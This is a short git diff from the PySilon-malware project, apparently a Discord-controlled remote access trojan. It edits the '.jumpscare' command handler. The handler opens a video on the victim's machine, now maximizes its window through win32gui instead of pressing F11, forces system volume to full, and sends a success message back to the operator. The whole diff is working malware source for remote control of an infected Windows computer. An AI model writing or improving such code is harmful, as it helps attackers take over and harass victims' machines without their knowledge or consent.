@@ -1,4 +1,6 @@
-import os, requests, time, pyautogui
+import win32gui
+import win32con
+import os, requests, time
 from ctypes import cast, POINTER
 from comtypes import CLSCTX_ALL
 from pycaw.pycaw import AudioUtilities, IAudioEndpointVolume
@@ -23,8 +25,8 @@ elif message.content == '.jumpscare':
 
     time.sleep(1)
     os.startfile(temp_file)
-    time.sleep(1)
-    pyautogui.press('f11')
+    get_video_window = win32gui.GetForegroundWindow()
+    win32gui.ShowWindow(get_video_window, win32con.SW_MAXIMIZE)
     volume.SetMasterVolumeLevelScalar(1.0, None)
     embed = discord.Embed(title="🟢 Success",description=f'```Jumpscare has been triggered.```', colour=discord.Colour.green())
     embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
